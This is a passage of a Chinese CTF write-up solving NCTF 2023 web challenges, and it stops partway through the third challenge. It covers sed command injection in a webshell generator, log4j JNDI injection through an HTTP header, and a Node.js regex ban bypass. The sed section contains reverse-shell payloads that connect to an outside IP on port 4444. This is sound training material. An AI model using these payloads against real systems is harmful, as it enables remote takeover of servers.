<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="9696c2e1957014f26d68c5b9257d6ba1">[NCTF 2023]Webshell Generator</h1>
<p>这道题其实可以算是签到题，主要的考点我觉得就是对linux三剑客之一的<code>sed</code>命令的熟悉程度。</p>
<p>1、首先进入页面，可以看到没有其它东西，是一个Webshell的生成器。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171234-33c9f4e2-c1ab-1.png"/></p>
<p>2、直接抓个包会发现会出现两个HTTP包，除了提交数据之外，还会出现一个<code>302</code>的重定向响应包，重定向后就会出现内容，在它的<code>file</code>参数会明显看到<code>/tmp/xxxxx</code>的路径，尝试换成其它文件，发现是存在任意文件读取的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171242-382b6c5a-c1ab-1.png"/></p>
<p>3、既然可以读取任意文件，按常规直接读取下<code>/flag</code>或者说<code>/proc/1/envrion</code>有无非预期(可惜没有)，那么就只能读源码看看，以下是读取到的源码：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">security_validate</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\r|\n/'</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"</span><span class="si">$key</span><span class="s2"> 不能包含换行符！"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">114</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"</span><span class="si">$key</span><span class="s2"> 不能超过114个字符！"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">security_validate</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'language'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">'PHP'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"PHP是最好的语言"</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="nv">$method</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">];</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'key'</span><span class="p">];</span>
    <span class="nb">putenv</span><span class="p">(</span><span class="s2">"METHOD=</span><span class="si">$method</span><span class="s2">"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"你的method太复杂了！"</span><span class="p">);</span>
    <span class="nb">putenv</span><span class="p">(</span><span class="s2">"KEY=</span><span class="si">$key</span><span class="s2">"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"你的key太复杂了！"</span><span class="p">);</span>
    <span class="nv">$status_code</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"sh generate.sh"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"生成失败了！"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: download.php?file=</span><span class="si">$filename</span><span class="s2">&amp;filename=</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<blockquote>
<p>接受<code>POST</code>请求的<code>method</code>、<code>Key</code>、<code>filename</code>参数，将<code>METHOD</code>和<code>key</code>放入了环境变量中，对<code>Key</code>进行了一定的检查，不允许换行符和不允许超过114个字符，随后就通过命令执行函数执行了<code>generate.sh</code></p>
</blockquote>
<p><code>generate.sh</code>:</p>
<div class="highlight"><pre><span></span><span class="nb">set</span> -e

<span class="nv">NEW_FILENAME</span><span class="o">=</span><span class="k">$(</span>tr -dc a-z0-9 &lt;/dev/urandom <span class="p">|</span> head -c <span class="m">16</span><span class="k">)</span>
cp template.php <span class="s2">"/tmp/</span><span class="nv">$NEW_FILENAME</span><span class="s2">"</span>
<span class="nb">cd</span> /tmp

sed -i <span class="s2">"s/KEY/</span><span class="nv">$KEY</span><span class="s2">/g"</span> <span class="s2">"</span><span class="nv">$NEW_FILENAME</span><span class="s2">"</span>
sed -i <span class="s2">"s/METHOD/</span><span class="nv">$METHOD</span><span class="s2">/g"</span> <span class="s2">"</span><span class="nv">$NEW_FILENAME</span><span class="s2">"</span>

realpath <span class="s2">"</span><span class="nv">$NEW_FILENAME</span><span class="s2">"</span>
</pre></div>
<blockquote>
<p>看到这里思路就清晰了，整个bash脚本随机了一个文件名，将<code>/var/www/html/template.php</code>复制到了<code>/tmp</code>并重命名，关键是<code>sed</code>的处理，直接文件中的<code>key</code>和<code>`method替换为环境变量中的</code>key<code>和</code>method<code>，而</code>key<code>和</code>method<code>是我们可控制的，所以有没有情况能够通过</code>sh<code>执行脚本触发</code>rce`</p>
</blockquote>
<p>开始我的想法是通过注释的形式来进行<code>rce</code>，因为<code>key</code>有长度限制，明智的就是用<code>method</code>来触发。</p>
<div class="highlight"><pre><span></span>aaaaa/g<span class="s2">" "</span><span class="nv">$NEW_FILENAME</span><span class="s2">";bash -i &gt;&amp; /dev/tcp/120.79.29.170/4444 0&gt;&amp;1 # </span>

<span class="s2">#替换后变成</span>
<span class="s2">sed -i "</span>s/METHOD/aaaaa/g<span class="s2">" "</span><span class="nv">$NEW_FILENAME</span><span class="s2">";bash -i &gt;&amp; /dev/tcp/120.79.29.170/4444 0&gt;&amp;1 # /g"</span> <span class="s2">"</span><span class="nv">$NEW_FILENAME</span><span class="s2">"</span>

比较可惜的是，这样子并不行，报错了，sed: -e expression <span class="c1">#1, char 17: unknown option to `s'</span>
</pre></div>
<p>似乎并不行，改了挺久也没能成功，找下其它思路，比如<code>sed</code>本身的东西，发现<code>sed -e</code>  有参数可以直接执行脚本。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171253-3f2e204c-c1ab-1.png"/></p>
<p>所以我们变成：</p>
<div class="highlight"><pre><span></span>aaaa/g<span class="p">;</span>e bash -c <span class="s2">"bash -i &gt;&amp; /dev/tcp/120.79.29.170/4444 0&gt;&amp;1"</span><span class="p">;</span>

<span class="c1">#整条变成：</span>
sed -i <span class="s2">"s/METHOD/aaaa/g;e bash -c "</span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/ip/4444 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="s2">";/g"</span> <span class="s2">"</span><span class="nv">$NEW_FILENAME</span><span class="s2">"</span>
</pre></div>
<blockquote>
<p>通过;分割命令的参数，整条命令就是将<code>$NEW_FILENAME</code>中的<code>METHOD</code>替换为<code>aaaa</code>，并且执行反弹shell的命令，至于<code>/g</code>并没有任何作用，只要不报错就好了。</p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171305-460eba20-c1ab-1.png"/></p>
<h1 data-content="1" id="753cf02d1f7a1375bcb6044b06459e18">[NCTF 2023]logging</h1>
<p>这道题考点是<code>log4j</code>，并且给的十分明显，但是需要对<code>log4j</code>有一定的熟悉程度，从<code>headers</code>头中打<code>log4j</code>。</p>
<p>1、 进入页面，明显的<code>Apache</code>框架，<code>It works</code>根据之前的经验+题目名称一眼丁真也可以判定<code>log4j</code>无疑，问题就在于参数呢，<code>JDNI</code>的注入点在哪里：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171310-49563226-c1ab-1.png"/></p>
<p>2、 既然没给到提示，普通的一些参数也无效，把目标转向了<code>Headers</code>头，发现只有<code>Accept</code>不对的时候，会出现<code>406</code>。</p>
<blockquote>
<p>HTTP 406状态码是指"不可接受"（Not Acceptable）。服务器收到的请求中包含了一个或多个要求资源的表示形式，但服务器无法生成与请求中所述的任何形式相匹配的响应。这意味着服务器无法提供与请求的Accept标头中指定的格式相匹配的响应。</p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171318-4dcf82f8-c1ab-1.png"/></p>
<p>3、 进一步测试，发现确实存在<code>JNDI</code>注入，并且是出网的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171327-5318c918-c1ab-1.png"/></p>
<p>4、 起个<code>LDAP</code>服务，带一个反弹shell的恶意类就可以成功拿到flag。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171332-56177510-c1ab-1.png"/></p>
<p>关于<code>log4j</code>漏洞的原理，简单分析下，核心代码如下：</p>
<p>1、 首先经过<code>converter.format()</code>会对内容进行格式化，在格式化的途中，<code>nolookups</code>默认是<code>false</code>的，表示进行格式化，在格式化的途中，它会取出<code>${}</code>中的内容进行替换方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171338-59f79688-c1ab-1.png"/></p>
<p>2、 在替换的方法中会进行<code>while</code>循环，<code>suffixMatcher.isMatch</code>会匹配<code>${</code> 字符，随手进入到第二层循环中，第二层循环一旦匹配到<code>}</code>字符，就会提取出<code>bufName</code>，也就是<code>jndi://ldap://xxx</code>的内容传到<code>substitute</code>方法中</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171344-5d43dcb6-c1ab-1.png"/></p>
<p>3、 而在这个解析的方法中，当它的前缀是<code>jndi</code>的时候，就会进入到<code>lookup</code>方法，这里前缀还可以是图中其它东西。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171350-611299b8-c1ab-1.png"/></p>
<p>4、 <code>lookup</code>接口将<code>jndi</code>前缀去除，拿到<code>ldap://</code>的内容，传到<code>lookup</code>中，完成远程类的加载，从而导致了<code>RCE</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171355-63a0883e-c1ab-1.png"/></p>
<h1 data-content="1" id="9099d23a2a15963bc36a8be6dc948ff7">[NCTF 2023]Wait What</h1>
<p>一道关于<code>node.js</code>的题目，需要一个小<code>tricks</code>绕过正则表达式的匹配，事实上对我来说，看<code>node.js</code>总感觉很吃力。</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">child_process</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">80</span>

<span class="kd">function</span> <span class="nx">escapeRegExp</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">string</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[.*+?^${}()|[\]\\]/g</span><span class="p">,</span> <span class="s1">'\\$&amp;'</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"admin"</span><span class="o">:</span> <span class="s2">"admin"</span><span class="p">,</span>
    <span class="s2">"user"</span><span class="o">:</span> <span class="s2">"user"</span><span class="p">,</span>
    <span class="s2">"guest"</span><span class="o">:</span> <span class="s2">"guest"</span><span class="p">,</span>
    <span class="s1">'hacker'</span><span class="o">:</span><span class="s1">'hacker'</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">banned_users</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'hacker'</span><span class="p">]</span>

<span class="c1">// 你不准getflag</span>
<span class="nx">banned_users</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">)</span>

<span class="kd">let</span> <span class="nx">banned_users_regex</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">build_banned_users_regex</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">regex_string</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">username</span> <span class="k">of</span> <span class="nx">banned_users</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">regex_string</span> <span class="o">+=</span> <span class="s2">"^"</span> <span class="o">+</span> <span class="nx">escapeRegExp</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"$"</span> <span class="o">+</span> <span class="s2">"|"</span>
    <span class="p">}</span>
    <span class="nx">regex_string</span> <span class="o">=</span> <span class="nx">regex_string</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">regex_string</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="nx">banned_users_regex</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="nx">regex_string</span><span class="p">,</span> <span class="s2">"g"</span><span class="p">)</span>
<span class="p">}</span>

<span class="c1">//鉴权中间件</span>
<span class="kd">function</span> <span class="nx">requireLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span>
    <span class="kd">let</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户名或密码不能为空"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">username</span> <span class="o">!==</span> <span class="s2">"string"</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">password</span> <span class="o">!==</span> <span class="s2">"string"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户名或密码不合法"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="c1">// 基于正则技术的封禁用户匹配系统的设计与实现</span>
    <span class="kd">let</span> <span class="nx">test1</span> <span class="o">=</span> <span class="nx">banned_users_regex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`使用正则</span><span class="si">${</span><span class="nx">banned_users_regex</span><span class="si">}</span><span class="sb">匹配</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">的结果为：</span><span class="si">${</span><span class="nx">test1</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">test1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"第一个判断匹配到封禁用户："</span><span class="p">,</span><span class="nx">username</span><span class="p">)</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户'"</span><span class="o">+</span><span class="nx">username</span> <span class="o">+</span> <span class="s2">"'被封禁，无法鉴权！"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="c1">// 基于in关键字的封禁用户匹配系统的设计与实现</span>
    <span class="kd">let</span> <span class="nx">test2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">username</span> <span class="k">in</span> <span class="nx">banned_users</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`使用in关键字匹配</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">的结果为：</span><span class="si">${</span><span class="nx">test2</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">test2</span><span class="p">){</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"第二个判断匹配到封禁用户："</span><span class="p">,</span><span class="nx">username</span><span class="p">)</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户'"</span><span class="o">+</span><span class="nx">username</span> <span class="o">+</span> <span class="s2">"'被封禁，无法鉴权！"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="k">in</span> <span class="nx">users</span> <span class="o">&amp;&amp;</span> <span class="nx">users</span><span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="o">===</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">next</span><span class="p">()</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户名或密码错误，鉴权失败！"</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">registerUser</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">username</span> <span class="o">!==</span> <span class="s2">"string"</span> <span class="o">||</span> <span class="nx">username</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"用户名不合法"</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">password</span> <span class="o">!==</span> <span class="s2">"string"</span> <span class="o">||</span> <span class="nx">password</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"密码不合法"</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="k">in</span> <span class="nx">users</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"用户已存在"</span>
    <span class="p">}</span>

    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">existing_user</span> <span class="k">in</span> <span class="nx">users</span><span class="p">){</span>
        <span class="kd">let</span> <span class="nx">existing_user_password</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">existing_user</span><span class="p">]</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">existing_user_password</span> <span class="o">===</span> <span class="nx">password</span><span class="p">){</span>
            <span class="k">return</span> <span class="sb">`您的密码已经被用户'</span><span class="si">${</span><span class="nx">existing_user</span><span class="si">}</span><span class="sb">'使用了，请使用其它的密码`</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">users</span><span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="o">=</span> <span class="nx">password</span>
    <span class="k">return</span> <span class="s2">"注册成功"</span>
<span class="p">}</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s1">'public'</span><span class="p">))</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nx">build_banned_users_regex</span><span class="p">()</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）："</span><span class="p">,</span><span class="nx">banned_users_regex</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">}</span>
    <span class="nx">next</span><span class="p">()</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/api/register"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span>
    <span class="kd">let</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span>
    <span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">registerUser</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/api/login"</span><span class="p">,</span> <span class="nx">requireLogin</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"登录成功！"</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/api/flag"</span><span class="p">,</span> <span class="nx">requireLogin</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">!==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"登录成功，但是只有'admin'用户可以看到flag，你的用户名是'"</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">"'"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">child_process</span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">"cat flag"</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！"</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">"finish"</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
        <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">},</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">})</span>
    <span class="k">return</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/api/ban_user'</span><span class="p">,</span> <span class="nx">requireLogin</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span>
    <span class="kd">let</span> <span class="nx">ban_username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ban_username</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ban_username</span><span class="p">){</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"ban_username不能为空"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">username</span> <span class="o">===</span> <span class="nx">ban_username</span><span class="p">){</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"不能封禁自己"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">name</span> <span class="k">of</span> <span class="nx">banned_users</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="nx">ban_username</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户已经被封禁"</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">banned_users</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ban_username</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"封禁成功！"</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/static/index.html"</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`listening on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
<span class="p">})</span>
</pre></div>
<blockquote>
<p>要得到flag，就需要以<code>admin</code>用户进行登录从而进行鉴权，就会自动把<code>flag</code>给你，但是在代码的前半部分，<code>admin</code>直接被加进了封禁用户的数组里面，并且每次登录都会进行中间件的鉴权，通过正则表达式<code>banned_users_regex.test</code>判断是否匹配成功，如果成功就直接在中间件返回了，没法拿到flag。</p>
</blockquote>
<p>首先看正则表达式：</p>
<div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nx">banned_users_regex</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">build_banned_users_regex</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">regex_string</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">username</span> <span class="k">of</span> <span class="nx">banned_users</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">regex_string</span> <span class="o">+=</span> <span class="s2">"^"</span> <span class="o">+</span> <span class="nx">escapeRegExp</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"$"</span> <span class="o">+</span> <span class="s2">"|"</span>
    <span class="p">}</span>
